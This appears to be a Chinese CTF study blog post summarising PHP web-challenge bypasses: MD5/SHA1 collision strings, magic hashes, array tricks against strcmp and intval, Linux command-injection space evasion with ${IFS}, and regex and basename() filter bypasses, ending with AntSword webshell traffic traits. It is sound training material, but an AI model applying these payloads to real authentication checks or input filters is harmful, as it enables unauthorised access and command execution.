{"title":"赛题总结1","uid":"befe7ebe5c3909555effd7c815dc781c","slug":"赛题总结1","date":"2024-10-31T08:36:49.000Z","updated":"2024-10-31T08:37:27.571Z","comments":true,"path":"api/articles/赛题总结1.json","keywords":null,"cover":"/image/9.jpg","content":"<p><a href=\"https://gz.imxbt.cn/games\">https://gz.imxbt.cn/games</a></p>\n<h1 id=\"Ctf经验及其题目总结\"><a href=\"#Ctf经验及其题目总结\" class=\"headerlink\" title=\"Ctf经验及其题目总结\"></a><strong>Ctf</strong>经验及其题目总结</h1><p><strong>l 做题经验：不要忽略</strong>index.php** 和查看<strong>源代码</strong> </p>\n<p>l <strong>robots.txt</strong></p>\n<p>l Sql先测闭合和和注释符</p>\n<h2 id=\"MD5各姿势绕过\"><a href=\"#MD5各姿势绕过\" class=\"headerlink\" title=\"MD5各姿势绕过\"></a>MD5各姿势绕过</h2><h3 id=\"1-判断是否为MD5的关键字\"><a href=\"#1-判断是否为MD5的关键字\" class=\"headerlink\" title=\"1.判断是否为MD5的关键字\"></a><strong>1.判断是否为MD5的关键字</strong></h3><p><strong>ffifdyop</strong> </p>\n<p>​                               </p>\n<h3 id=\"2-MD5比较-（双-）\"><a href=\"#2-MD5比较-（双-）\" class=\"headerlink\" title=\"2.MD5比较 （双&#x3D;&#x3D;）\"></a>2.<strong>MD5</strong>比较 （双&#x3D;&#x3D;）</h3><p>l md5_1&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</p>\n<p>&amp;md5_2&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</p>\n<p>l $a&#x3D;\\x4d\\xc9\\x68\\xff\\x0e\\xe3\\x5c\\x20\\x95\\x72\\xd4\\x77\\x7b\\x72\\x15\\x87\\xd3\\x6f\\xa7\\xb2\\x1b\\xdc\\x56\\xb7\\x4a\\x3d\\xc0\\x78\\x3e\\x7b\\x95\\x18\\xaf\\xbf\\xa2\\x00\\xa8\\x28\\x4b\\xf3\\x6e\\x8e\\x4b\\x55\\xb3\\x5f\\x42\\x75\\x93\\xd8\\x49\\x67\\x6d\\xa0\\xd1\\x55\\x5d\\x83\\x60\\xfb\\x5f\\x07\\xfe\\xa2</p>\n<p>$b&#x3D;\\x4d\\xc9\\x68\\xff\\x0e\\xe3\\x5c\\x20\\x95\\x72\\xd4\\x77\\x7b\\x72\\x15\\x87\\xd3\\x6f\\xa7\\xb2\\x1b\\xdc\\x56\\xb7\\x4a\\x3d\\xc0\\x78\\x3e\\x7b\\x95\\x18\\xaf\\xbf\\xa2\\x02\\xa8\\x28\\x4b\\xf3\\x6e\\x8e\\x4b\\x55\\xb3\\x5f\\x42\\x75\\x93\\xd8\\x49\\x67\\x6d\\xa0\\xd1\\xd5\\x5d\\x83\\x60\\xfb\\x5f\\x07\\xfe\\xa2</p>\n<h3 id=\"3：-a-b-md5-a-md5-b\"><a href=\"#3：-a-b-md5-a-md5-b\" class=\"headerlink\" title=\"3：$a !&#x3D; $b &amp;&amp; md5($a) &#x3D;&#x3D; md5($b)\"></a><strong>3</strong>：$a !&#x3D; $b &amp;&amp; md5($a) &#x3D;&#x3D; md5($b)</h3><p>​    此时我们需要满足 a 不等于 b 但是 a 和 b 进行 md5 后的数值需要相等</p>\n<p>​    可以让a &#x3D;<strong>QNKCDZO</strong> b&#x3D;&#x3D;<strong>240610708</strong>  s878926199a  s155964671a <code>QLTHNDT</code></p>\n<p>QNKCDZO 和 240610708 进行 md5 后加密的数值为 0e开头，在 PHP 中会被识别为科学计数法，所有 0e 开头的数据进行弱类型比较皆为 True </p>\n<p>​    或者<strong>a[]&#x3D;1&amp;b[]&#x3D;1,md5无法进行数组比较 即可绕过</strong> </p>\n<h3 id=\"4：-强类型比较\"><a href=\"#4：-强类型比较\" class=\"headerlink\" title=\"4：&#x3D;&#x3D;&#x3D;强类型比较\"></a><strong>4</strong>：&#x3D;&#x3D;&#x3D;强类型比较</h3><p> <code>$_POST``[``&#39;param1&#39;``]!==``$_POST``[``&#39;param2&#39;``]&amp;&amp;``md5``(``$_POST``[``&#39;param1&#39;``])===``md5``(``$_POST``[``&#39;param2&#39;``]</code></p>\n<p>··       仍可用数组进行比较<strong>param1[]&#x3D;1&amp;param2[]&#x3D;2</strong></p>\n<p>​    <strong>Or</strong></p>\n<p>​    array1&#x3D;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab</p>\n<p>&amp;</p>\n<p>array2&#x3D;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab</p>\n<p><strong>or</strong></p>\n<p>​    <strong>a&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</strong></p>\n<p><strong>&amp;b&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</strong></p>\n<p><strong>Sha1</strong></p>\n<p>array1&#x3D;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C&#x2F;Width%202%200%20R&#x2F;Height%203%200%20R&#x2F;Type%204%200%20R&#x2F;Subtype%205%200%20R&#x2F;Filter%206%200%20R&#x2F;ColorSpace%207%200%20R&#x2F;Length%208%200%20R&#x2F;BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85&#x2F;%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr&#x2F;%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;array2&#x3D;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C&#x2F;Width%202%200%20R&#x2F;Height%203%200%20R&#x2F;Type%204%200%20R&#x2F;Subtype%205%200%20R&#x2F;Filter%206%200%20R&#x2F;ColorSpace%207%200%20R&#x2F;Length%208%200%20R&#x2F;BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85&#x2F;%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2&#x2F;%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</p>\n<h3 id=\"5-md5-a-md5-md5-b\"><a href=\"#5-md5-a-md5-md5-b\" class=\"headerlink\" title=\"5.md5($a) &#x3D;&#x3D; md5(md5($b)\"></a><strong>5.md5($a) &#x3D;&#x3D; md5(md5($b)</strong></h3><p>md和md5后都是以0e开头的字符串：</p>\n<p>wSfHENKtYMLp9dlXrjTf&#x3D;&gt;0e831574571239196549417613222648</p>\n<p>DZScqjlajV0mrWZl6YUw&#x3D;&gt;0e328945755880883750704598784448</p>\n<h3 id=\"4-a-md5-a\"><a href=\"#4-a-md5-a\" class=\"headerlink\" title=\"4.$a&#x3D;&#x3D;md5($a)\"></a><strong>4.$a&#x3D;&#x3D;md5($a)</strong></h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0e215962017</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"php-弱类型总结\"><a href=\"#php-弱类型总结\" class=\"headerlink\" title=\"php 弱类型总结\"></a>php 弱类型总结</h2><h3 id=\"md5\"><a href=\"#md5\" class=\"headerlink\" title=\"md5\"></a>md5</h3><p>上文已总结</p>\n<h3 id=\"json-绕过\"><a href=\"#json-绕过\" class=\"headerlink\" title=\"json 绕过\"></a>json 绕过</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;message&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$message</span> = <span class=\"title function_ invoke__\">json_decode</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;message&#x27;</span>]);</span><br><span class=\"line\">    <span class=\"variable\">$key</span> =<span class=\"string\">&quot;*********&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$message</span>-&gt;key == <span class=\"variable\">$key</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;flag&quot;</span>;</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;fail&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">     <span class=\"keyword\">echo</span> <span class=\"string\">&quot;~~~~&quot;</span>;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n\n<p>分析：输入一个json类型的字符串，json_decode函数解密成一个数组，判断数组中key的值是否等于 $key的值，但是$key的值我们不知道，但是可以利用0&#x3D;&#x3D;”admin”这种形式绕过</p>\n<p>最终payload <strong>message&#x3D;{“key”:0}</strong>                      </p>\n<h3 id=\"array-search（）-绕过\"><a href=\"#array-search（）-绕过\" class=\"headerlink\" title=\"array_search（） 绕过\"></a>array_search（） 绕过</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"number\">1</span> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"> <span class=\"number\">2</span> <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">is_array</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;test&#x27;</span>]))&#123;<span class=\"keyword\">exit</span>();&#125;</span><br><span class=\"line\"> <span class=\"number\">3</span> <span class=\"variable\">$test</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;test&#x27;</span>];</span><br><span class=\"line\"> <span class=\"number\">4</span> <span class=\"keyword\">for</span>(<span class=\"variable\">$i</span>=<span class=\"number\">0</span>;<span class=\"variable\">$i</span>&lt;<span class=\"title function_ invoke__\">count</span>(<span class=\"variable\">$test</span>);<span class=\"variable\">$i</span>++)&#123;</span><br><span class=\"line\"> <span class=\"number\">5</span>     <span class=\"keyword\">if</span>(<span class=\"variable\">$test</span>[<span class=\"variable\">$i</span>]===<span class=\"string\">&quot;admin&quot;</span>)&#123;</span><br><span class=\"line\"> <span class=\"number\">6</span>         <span class=\"keyword\">echo</span> <span class=\"string\">&quot;error&quot;</span>;</span><br><span class=\"line\"> <span class=\"number\">7</span>         <span class=\"keyword\">exit</span>();</span><br><span class=\"line\"> <span class=\"number\">8</span>     &#125;</span><br><span class=\"line\"> <span class=\"number\">9</span>     <span class=\"variable\">$test</span>[<span class=\"variable\">$i</span>]=<span class=\"title function_ invoke__\">intval</span>(<span class=\"variable\">$test</span>[<span class=\"variable\">$i</span>]);</span><br><span class=\"line\"><span class=\"number\">10</span> &#125;</span><br><span class=\"line\"><span class=\"number\">11</span> <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">array_search</span>(<span class=\"string\">&quot;admin&quot;</span>,<span class=\"variable\">$test</span>)===<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\"><span class=\"number\">12</span>     <span class=\"keyword\">echo</span> <span class=\"string\">&quot;flag&quot;</span>;</span><br><span class=\"line\"><span class=\"number\">13</span> &#125;</span><br><span class=\"line\"><span class=\"number\">14</span> <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\"><span class=\"number\">15</span>     <span class=\"keyword\">echo</span> <span class=\"string\">&quot;false&quot;</span>;</span><br><span class=\"line\"><span class=\"number\">16</span> &#125;</span><br><span class=\"line\"><span class=\"number\">17</span> <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>分析：上面是自己写的一个，先判断传入的是不是数组，</p>\n<p>然后循环遍历数组中的每个值，并且数组中的每个键值不能和admin相等，</p>\n<p>并且将每个值转化为int类型，</p>\n<p>再判断传入的数组是否有“admin”，有则返回flag</p>\n<p>payload</p>\n<p> <strong>test&#x3D;[0]</strong></p>\n<p>array_search() 函数与 in_array() 一样，在数组中查找一个键值。如果找到了该值，则返回匹配该元素所对应的键名。如果没找到，则返回 false</p>\n<p>原因：array_serch()  在判断数组里面有没有 键值与  字符串“admin”相等 的   用的是 &#x3D;&#x3D;  ，根据php弱类型，字符串admin 的值为 0  ，所以构造一个含有0索引位置的键值为0 的数组 test 就可以成功绕过</p>\n<h3 id=\"strcmp（）绕过\"><a href=\"#strcmp（）绕过\" class=\"headerlink\" title=\"strcmp（）绕过\"></a>strcmp（）绕过</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"> <span class=\"number\">2</span>     <span class=\"variable\">$password</span>=<span class=\"string\">&quot;***************&quot;</span></span><br><span class=\"line\"> <span class=\"number\">3</span>      <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>]))&#123;</span><br><span class=\"line\"> <span class=\"number\">4</span> </span><br><span class=\"line\"> <span class=\"number\">5</span>         <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">strcmp</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>], <span class=\"variable\">$password</span>) == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\"> <span class=\"number\">6</span>             <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Right!!!login success&quot;</span>;n</span><br><span class=\"line\"> <span class=\"number\">7</span>             <span class=\"keyword\">exit</span>();</span><br><span class=\"line\"> <span class=\"number\">8</span>         &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"> <span class=\"number\">9</span>             <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Wrong password..&quot;</span>;</span><br><span class=\"line\"><span class=\"number\">10</span>         &#125;</span><br><span class=\"line\"><span class=\"number\">11</span> <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n\n<p>分析：strcmp是比较两个字符串，如果str1&lt;str2 则返回值&lt;0 ，如果str1大于str2返回&gt;0 ，如果两者相等 返回0</p>\n<p>我们是不知道$password的值的，题目要求strcmp判断的接受的值和$password必需相等，strcmp传入的期望类型是字符串类型，如果传入的是个<strong>数组</strong>会怎么样呢</p>\n<p>我们传入 password[]&#x3D;xxx 可以绕过 是因为函数接受到了不符合的类型，将发生错误，但是还是判断其相等</p>\n<p>payload: <strong>password[]&#x3D;xxx</strong></p>\n<h3 id=\"switch（）绕过\"><a href=\"#switch（）绕过\" class=\"headerlink\" title=\"switch（）绕过\"></a>switch（）绕过</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"> <span class=\"number\">2</span> <span class=\"variable\">$a</span>=<span class=\"string\">&quot;4admin&quot;</span>;</span><br><span class=\"line\"> <span class=\"number\">3</span> <span class=\"keyword\">switch</span> (<span class=\"variable\">$a</span>) &#123;</span><br><span class=\"line\"> <span class=\"number\">4</span>     <span class=\"keyword\">case</span> <span class=\"number\">1</span>:</span><br><span class=\"line\"> <span class=\"number\">5</span>         <span class=\"keyword\">echo</span> <span class=\"string\">&quot;fail1&quot;</span>;</span><br><span class=\"line\"> <span class=\"number\">6</span>         <span class=\"keyword\">break</span>;</span><br><span class=\"line\"> <span class=\"number\">7</span>     <span class=\"keyword\">case</span> <span class=\"number\">2</span>:</span><br><span class=\"line\"> <span class=\"number\">8</span>         <span class=\"keyword\">echo</span> <span class=\"string\">&quot;fail2&quot;</span>;</span><br><span class=\"line\"> <span class=\"number\">9</span>         <span class=\"keyword\">break</span>;</span><br><span class=\"line\"><span class=\"number\">10</span>     <span class=\"keyword\">case</span> <span class=\"number\">3</span>:</span><br><span class=\"line\"><span class=\"number\">11</span>         <span class=\"keyword\">echo</span> <span class=\"string\">&quot;fail3&quot;</span>;</span><br><span class=\"line\"><span class=\"number\">12</span>         <span class=\"keyword\">break</span>;</span><br><span class=\"line\"><span class=\"number\">13</span>     <span class=\"keyword\">case</span> <span class=\"number\">4</span>:</span><br><span class=\"line\"><span class=\"number\">14</span>         <span class=\"keyword\">echo</span> <span class=\"string\">&quot;sucess&quot;</span>;  <span class=\"comment\">//结果输出success;</span></span><br><span class=\"line\"><span class=\"number\">15</span>         <span class=\"keyword\">break</span>;</span><br><span class=\"line\"><span class=\"number\">16</span>     <span class=\"keyword\">default</span>:</span><br><span class=\"line\"><span class=\"number\">17</span>         <span class=\"keyword\">echo</span> <span class=\"string\">&quot;failall&quot;</span>;</span><br><span class=\"line\"><span class=\"number\">18</span>         <span class=\"keyword\">break</span>;</span><br><span class=\"line\"><span class=\"number\">19</span> &#125;</span><br><span class=\"line\"><span class=\"number\">20</span> <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>分析 ： 在进行switch 选择时 $a<strong>会被强制转换成整形</strong>进行对照<br>所以 令$a&#x3D;”4asdfs” &#x3D;int（4）成功进行绕过</p>\n<h3 id=\"成也布尔，败也布尔\"><a href=\"#成也布尔，败也布尔\" class=\"headerlink\" title=\"成也布尔，败也布尔\"></a>成也布尔，败也布尔</h3><p>成也布尔，败也布尔‘，布尔类型的true跟任意字符串在‘&#x3D;&#x3D;’下成立</p>\n<h3 id=\"intval绕过\"><a href=\"#intval绕过\" class=\"headerlink\" title=\"intval绕过\"></a>intval绕过</h3><p> <a href=\"https://www.nssctf.cn/problem/2076\">https://www.nssctf.cn/problem/2076</a> </p>\n<p>   <img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%931/image-20241028125954256.png\" alt=\"image-20241028125954256\">                       </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">通过使用指定的进制 base 转换（默认是十进制），返回变量 value 的 int 数值。 intval() 不能用于 object，否则会产生 E_WARNING 错误并返回 1。 </span><br><span class=\"line\">echo intval(array());                 // 0</span><br><span class=\"line\">echo intval(array(&#x27;foo&#x27;, &#x27;bar&#x27;));     // 1</span><br></pre></td></tr></table></figure>\n\n<p>传入数组就能绕过<br>a[]&#x3D;1 </p>\n<h3 id=\"linux-rce空格绕过\"><a href=\"#linux-rce空格绕过\" class=\"headerlink\" title=\"linux rce空格绕过\"></a>linux rce空格绕过</h3><p><strong>${IFS}&#x2F;$IFS</strong></p>\n<p> <img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%931/image-20241028130105896.png\" alt=\"image-20241028130105896\"></p>\n<p><strong>空格</strong>替代 eg:<strong>cat &#x2F;1.php &#x3D;&#x3D; cat${IFS}&#x2F;1.php</strong></p>\n<p><strong>&#x3D;的平替like;空格的平替：&#x2F;**&#x2F;, %20, %0a(换行),%a0,(),+;</strong></p>\n<p>8：preg_match绕过 </p>\n<p>1：长度绕过 污染参数，在要传所需参数前传一个无关参数</p>\n<p>Eg:所需参数是cmd 传参是可以  a&#x3D;aaaaaaaaaaaaaaaaaaaaaaaaaa**&amp;cmd&#x3D;xxxxxxxx** <strong>标记部分为参数污染部分</strong></p>\n<p><strong>2：[  空格 + .</strong> 这四个都可以被处理为**_**</p>\n<p><strong>9：</strong>正则绕过及basename()函数 <a href=\"https://www.nssctf.cn/problem/463\">https://www.nssctf.cn/problem/463</a></p>\n<p>详解 <a href=\"https://www.cnblogs.com/FPointzero/p/16438478.html\">https://www.cnblogs.com/FPointzero/p/16438478.html</a></p>\n<p><strong>1：basename()：</strong>返回路径中的文件名部分。但是它有个小问题，它会去掉文件名</p>\n<p>开头的非 ASCII 值。</p>\n<p>例子：<br> 127.0.0.1&#x2F;pikachu&#x2F;index.php?file&#x3D;1.php 显示：1.php</p>\n<p>127.0.0.1&#x2F;pikachu&#x2F;index.php?file&#x3D;flag.php&#x2F;1.php 显示：1.php</p>\n<p>2：SERVER[′REQUESTURI′]：与 _SERVER[‘PHP_SELF’]的区别是会加上参数</p>\n<p>例子：</p>\n<p>127.0.0.1&#x2F;pikachu&#x2F;index.php?file&#x3D;1.php 显示：&#x2F;pikachu&#x2F;index.php?1.php</p>\n<p>3：$_SERVER[‘PHP_SELF’] ：正在执行脚本的文件名</p>\n<p>例子：</p>\n<p>127.0.0.1&#x2F;pikachu&#x2F;index.php 显示：&#x2F;pikachu&#x2F;index.php</p>\n<p>4：<strong>basename()绕过 添加非ascii编码字符 eg：汉字 %a0等</strong></p>\n<p><strong>5：</strong>preg_match中show_source绕过 替换成 show[source, show source, show+source, show.source</p>\n<p><strong>10:</strong> show_souerce</p>\n<p>在 URL 中使用 show_source 是一种 PHP 提供的特殊功能，用于查看指定文件的源代码。当在 URL 中添加 show_source&#x3D;文件路径时，服务器会返回该文件的源代码而不是执行它。</p>\n<h1 id=\"MISC\"><a href=\"#MISC\" class=\"headerlink\" title=\"MISC\"></a>MISC</h1><h2 id=\"蚁剑流量分析特征\"><a href=\"#蚁剑流量分析特征\" class=\"headerlink\" title=\"蚁剑流量分析特征\"></a>蚁剑流量分析特征</h2><h3 id=\"LitCTF2024\"><a href=\"#LitCTF2024\" class=\"headerlink\" title=\"LitCTF2024\"></a>LitCTF2024</h3><p>1.明显的特征为**@ini_set(“display_errors”，”0”);@set_time_limit(0)开头**</p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%931/image-20240602174938709.png\" alt=\"image-20240602174938709\"></p>\n<p>2.使用<strong>base64或文本转16进制</strong>加密的payload</p>\n<p>并且<strong>附有混淆随机数</strong>，base64中还有混淆字符（前两个），所以需要我们<strong>删除</strong>流量信息中的<strong>前两个字符</strong>后才能<strong>得到无混淆base64</strong>。</p>\n<p>eg:<img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%931/image-20240602175652512.png\" 